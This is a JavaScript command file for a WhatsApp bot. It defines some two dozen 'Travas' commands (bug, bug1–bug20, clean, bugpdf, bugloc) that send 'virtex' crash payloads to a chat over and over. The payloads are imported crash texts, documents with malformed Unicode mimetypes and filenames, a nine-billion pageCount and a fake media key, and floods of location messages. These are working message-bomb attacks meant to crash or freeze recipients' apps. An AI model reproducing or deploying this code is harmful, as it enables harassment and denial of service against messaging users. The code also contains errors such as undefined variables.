/**
 * Copyright (C) 2024 CrazyPrince
 *
 * Licensed under the GNU General Public License v3.0 (GPL-3.0)
 * You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     (https://whatsapp.com/channel/0029VaV3DymGE56jsC8j1M3c)
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @project       CRAZY-MD
 * @author        CrazyPrince <https://github.com/CrazyPrince>
 * @description   CrazyMd, a simple multi-functional WhatsApp bot.
 * @version       0.0.1
 * @license       GPL-3.0
 * @link          (https://github.com/CrazyPrince/CRAZY-MD)
 */
const axios = require('axios')
const pino = require("pino");
const { sck1, tiny, fancytext, cmd } = require('../lib/')
const fs = require('fs-extra');
const { exec } = require('child_process')




// Définir les valeurs de configuration directement dans le fichier
const LENGTH = 5; // Nombre de fois que le texte est dupliqué
const FORCE = 3;  // Nombre de fois que le message est envoyé
const predefinedText = "Pour définir les valeurs de length et force directement dans le fichier de commande sans utiliser de variables de configuration ou d’environnement, vous pouvez simplement les définir comme des constantes au début de votre fichier. Voici comment vous pouvez structurer cela";

cmd({
        pattern: "bug",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            let fancyPart = fancytext(predefinedText, 6);  // Utiliser directement predefinedText
            let txt = `💣CRAZY-MD💣=> ${fancyPart} end.`;
            
            // Répéter le texte selon LENGTH
            let fullText = txt.repeat(LENGTH);

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE; i++) {
                await Void.sendMessage(citel.chat, { text: fullText }, { quoted: citel });
            }
        } catch (error) {
            console.error("Error sending Bugtext message: ", error);
        }
    }
);

//==========================================CLEAN===============================================

// Définir les valeurs de configuration directement dans le fichier
const LENGTH1 = 3; // Nombre de fois que le texte est dupliqué
const FORCE1 = 3;  // Nombre de fois que le message est envoyé
let prefix = '໒ཞศƶƴ_♇ཞརས໒ཛ👑===>>💣💣💣777';
const {crazyvirtex1} = require('../lib/virtex/crazyvirtex1');

cmd({
        pattern: "clean",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "🛡️",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            
            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE1; i++) {
                await Void.sendMessage(citel.chat, { text: crazyvirtex1},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);

///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
// Définir les valeurs de configuration directement dans le fichier
const LENGTH2 = 1; // Nombre de fois que le texte est dupliqué
const FORCE2 = 3;  // Nombre de fois que le message est envoyé
const {crazyvirtex2} = require('../lib/virtex/crazyvirtex2');

cmd({
        pattern: "bug1",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE2; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex2.toString()},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 3=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH3 = 1; // Nombre de fois que le texte est dupliqué
const FORCE3 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex3 = require('../lib/virtex/crazyvirtex3');

cmd({
        pattern: "bug2",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
                        // Convertir crazyvirtex3 en chaîne si ce n'est pas déjà le cas
            const messageText3 = String(crazyvirtex3);

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE3; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + messageText3.toString()},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);


///////////////////////////////////////////==========================BUG 4=====================///////////////////////////////////////////////////////
// Définir les valeurs de configuration directement dans le fichier
const LENGTH4 = 1; // Nombre de fois que le texte est dupliqué
const FORCE4 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex4 = require('../lib/virtex/crazyvirtex4');

cmd({
        pattern: "bug3",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
        

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE4; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex4},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);


///////////////////////////////////////////============================BUG 5===================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH5 = 1; // Nombre de fois que le texte est dupliqué
const FORCE5 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex5 = require('../lib/virtex/crazyvirtex5');

cmd({
        pattern: "bug4",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE5; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex5},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 6=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH6 = 1; // Nombre de fois que le texte est dupliqué
const FORCE6 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex6 = require('../lib/virtex/crazyvirtex6');

cmd({
        pattern: "bug5",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE6; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex6},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 7=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH7 = 1; // Nombre de fois que le texte est dupliqué
const FORCE7 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex7 = require('../lib/virtex/crazyvirtex7');

cmd({
        pattern: "bug6",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE7; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex7},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 8=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH8 = 1; // Nombre de fois que le texte est dupliqué
const FORC8 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex8 = require('../lib/virtex/crazyvirtex8');

cmd({
        pattern: "bug7",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE8; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex8},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////========================BUG 9=======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH9 = 1; // Nombre de fois que le texte est dupliqué
const FORCE9 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex9 = require('../lib/virtex/crazyvirtex9');

cmd({
        pattern: "bug8",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE9; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex9},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////=========================BUG 10======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH10 = 1; // Nombre de fois que le texte est dupliqué
const FORCE10 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex10 = require('../lib/virtex/crazyvirtex10');

cmd({
        pattern: "bug9",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            
            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex10},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////=========================BUG 11======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH11 = 1; // Nombre de fois que le texte est dupliqué
const FORCE11 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex11 = require('../lib/virtex/crazyvirtex11');

cmd({
        pattern: "bug10",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE11; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex11},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 12=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH12 = 1; // Nombre de fois que le texte est dupliqué
const FORCE12 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex12 = require('../lib/virtex/crazyvirtex12');

cmd({
        pattern: "bug11",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE12; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex12},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 13=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH13 = 1; // Nombre de fois que le texte est dupliqué
const FORCE13 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex13 = require('../lib/virtex/crazyvirtex13');

cmd({
        pattern: "bug12",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE13; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex13},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 14=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH14 = 1; // Nombre de fois que le texte est dupliqué
const FORCE14 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex14 = require('../lib/virtex/crazyvirtex14');

cmd({
        pattern: "bug13",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE14; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex14},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 15=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH15 = 1; // Nombre de fois que le texte est dupliqué
const FORCE15 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex15 = require('../lib/virtex/crazyvirtex15');

cmd({
        pattern: "bug14",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel) => {
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE15; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex15},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 16=====================///////////////////////////////////////////////////////
// bug database
const { bugtext1 } = require("../lib/virtex/bugtext1");
const { bugtext2 } = require("../lib/virtex/bugtext2");
const { bugtext3 } = require("../lib/virtex/bugtext3");
const { bugtext4 } = require("../lib/virtex/bugtext4");
const { bugtext5 } = require("../lib/virtex/bugtext5");
const { bugtext6 } = require("../lib/virtex/bugtext6");
const { bugpdf } = require("../lib/virtex/bugpdf.js");

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug15",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug = bugtext6;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug16",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug1 = bugtext5;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug1},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////

cmd({
        pattern: "bug17",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug2 = bugtext4;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug2},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug18",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug3 = bugtext3;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug3},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////

cmd({
        pattern: "bug19",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug4 = bugtext2;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug4},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug20",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        const bug5 = bugtext1;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug5},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bugpdf",
        desc: "Sends a travas bug pdf",
        category: "Travas",
        use: 'bugpdf',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {


        // send loading message
        await Void.sendMessage(citel.chat, { text: `processing your bugpdf`},{ quoted: citel });

        for (let i = 0; i < 25; i++) {
            const doc = { url: "./config.js" };
            await Void.sendMessage(citel.chat, {
                document: doc,
                mimetype:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
                title: "travas.pdf",
                pageCount: 9999999999,
                thumbnail: {
                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
                },
                thumbnailUrl:
                    "https://telegra.ph/file/1fd66052a2f356014d861.jpg",
                jpegThumbnail: {
                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
                },
                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
                fileName:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                    bugpdf
            });
        }
        await Void.sendMessage(citel.chat, { react: { text: "✅", key: ms.key } });
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bugloc",
        desc: "Sends a travas bug location",
        category: "Travas",
        use: 'bugloc',
        react: "💣",
        filename: __filename
    },

    async (Void, citel) => {
        
        
        await Void.sendMessage(citel.chat, { text: `processing your location bug`},{ quoted: citel });

        for (let i = 0; i < 20; i++) {
            for (let j = 0; j < "3"; j++) {
                Void.sendMessage(
                    citel.chat,
                    {
                        location: {
                            degreesLatitude: 34.745948,
                            degreesLongitude: -92.289883,
                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
                        }
                    },
                    { quoted: citel }
                );
            }
        }
        await Void.sendMessage(citel.chat, { react: { text: "💥", key: ms.key } });
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////

